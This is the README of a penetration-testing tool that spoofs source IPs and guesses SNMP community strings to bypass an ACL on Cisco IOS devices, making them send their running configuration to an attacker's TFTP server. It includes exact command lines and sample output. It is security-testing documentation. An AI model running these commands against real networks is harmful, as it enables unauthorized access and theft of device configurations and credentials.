OVERVIEW
========
cisco-snmp-slap utilises IP address spoofing in order to bypass an ACL
protecting an SNMP service on a Cisco IOS device.

Typically IP spoofing has limited use during real attacks outside DoS. Any TCP
service cannot complete the inital handshake. UDP packets are easier to spoof
but the return packet is often sent to the wrong address, which makes it 
difficult to collect any information returned.

However if an attacker can guess the snmp rw community string and a valid source
address an attacker can set SNMP MiBs. One of the more obvious uses for this
is to have a Cisco SNMP service send its IOS configuration file to another
device.

This tool allows you to try one or more community strings against a Cisco device
from one or more IP addresses. When specifying IP addresses you can choose to
subsequently or randomly go through a range of source addresses.

To specifying range of source IP addresses to check an initial source address
and IP mask are supplied. Any bits set in the IP mask will be used to generate
source IP addresses by altering the initial source address.

For example, if a source address of `10.0.0.0` is supplied with a IP mask of
0.0.0.255 then the script will explore the address from `10.0.0.0` to `10.0.0.255`.

The bits set do not have to be sequential like a subnet mask. For example the
mask 0.128.1.255 is valid and will explore the ranges `10.0,128.0-1.0-255`.

When checking a range of IP addresses randomly or sequentially it requires you to
enter the path to the root of the tftp directory. The script will check this
directory to see if the file has been successfully transferred.

This tool was written to target Cisco layer 3 switches during pentests, though
it may have other users. It works well against these devices because:

1. layer 3 switches rarely have reverse path verification configured in the
author's experience
2. there are no routers or other devices which may be able to detect that
IP spoofing is occurring.

Though I hope that users will find other interesting uses for this script
and its source code.

USAGE 
=====
In this example I will take a simple IOS device with an access list
protecting a SNMP service using the community string 'cisco'

    access-list 10 permit 10.100.100.0 0.0.0.255
    snmp-server community cisco rw 10
    
One IOS device's IP address is `10.0.0.1`

The pentester has an IP address `10.0.0.2` and has started a TFTP server.

If the tester knows all of this they use the one shot single mode to
grab the device's config file. E.g.
 
    ./slap.py single cisco 10.0.0.2 10.100.100.100 10.0.0.1
    
If the tester doesn't know the details of they could try and guess.
Lets say the tester has done some recon and has figured out that 
all internal addresses are the 10.0.0.0/8 range.

    ./slap.py seqmask private 10.0.0.2 10.0.0.0 0.255.255.0 10.0.0.1 /tftproot/
  
This command will search through all the /24, the tester hopes they can
save some time by assuming a whole subnet will be allowed access rather
than just one IP address.

    root@Athena:/home/notroot/cisco-snmp-slap# ./slap.py seqmask cisco 10.0.0.2 10.0.0.5 0.255.255.0 10.0.0.1 /tftproot/
    Cisco SNMP Slap,  v0.3
    Darren McDonald, darren.mcdonald@nccgroup.com
    
    WARNING: No route found for IPv6 destination :: (no default route?)
    Community String:   cisco
    TFTP Server IP  :   10.0.0.2
    Source IP:          10.0.0.5
    Source Mask:        0.255.255.0
    Destination IP:     10.0.0.1
    TFTP Root Path:     /tftproot//cisco-config.txt
    10.0.0.5
    10.0.1.5
    10.0.2.5
    < ... cut for brevity ... >
    10.100.99.255
    10.100.100.0
    10.100.100.1
    10.100.100.2
    10.100.100.3
    10.100.100.4
    10.100.100.5
    10.100.100.6
    Success!
 
You should notice that the program exists and announces success several IP
addresses after it enters the `10.100.100.0/24` range. This because it is not
possible to determine which source address was successful, but determines one
of the requests was successful after the config file turns up in the tftproot.
Given you've just nabbed the running config you can now find out the details
of the ACL yourself.

Rather than specifying a single community string you can also give a list
which should be used. The mode names are the same except have a `'_l'` suffix.

For example to repeat the same attack using a list of community strings in in
list.txt the following arguments should be used.

    root@Athena:/home/notroot/cisco-snmp-slap# ./slap.py seqmask_l list.txt 10.0.0.2 10.0.0.5 0.255.255.0 10.0.0.1 /tftproot/
    Cisco SNMP Slap,  v0.3
    Darren McDonald, darren.mcdonald@nccgroup.com
    
    WARNING: No route found for IPv6 destination :: (no default route?)
    Community File: list.txt
    TFTP Server IP  :   10.0.0.2
    Source IP:  10.0.0.5
    Source Mask:0.255.255.0
    Destination IP: 10.0.0.1
    TFTP Root Path: /tftproot//cisco-config.txt
    community strings loaded:  ['private\n', 'cisco\n', 'public\n']
    10.0.0.5 /  private
    10.0.0.5 /  cisco
    10.0.0.5 /  public
    10.0.1.5 /  private
    10.0.1.5 /  cisco
    10.0.1.5 /  public
    10.0.2.5 /  private
    10.0.2.5 /  cisco
    10.0.2.5 /  public
    10.0.3.5 /  private
    10.0.3.5 /  cisco
    10.0.3.5 /  public

Now each IP address is checked with each community string in list.txt.

SUPPORT 
=======

As programming languages go Python is a simple language, easy to read and write
and I encourage you to attempt to debug and correct any issues you find and
send me your changes so I can share them with other users on the NCC Github.

But if you need assistance you can contact me at darren.mcdonald@nccgroup.com.
I'll do my best to help you but you should be aware I am not a full time
developer (which should be obvious from my code!) and may not immediately have
time get to your query.

VERSIONS
========

* 0.1 Inital version
* 0.2 Added random and sequental modes and source address masks
* 0.3 added community string file list feature, first public version
* 0.3.1 now uses os.sep so that paths work correctly on Windows
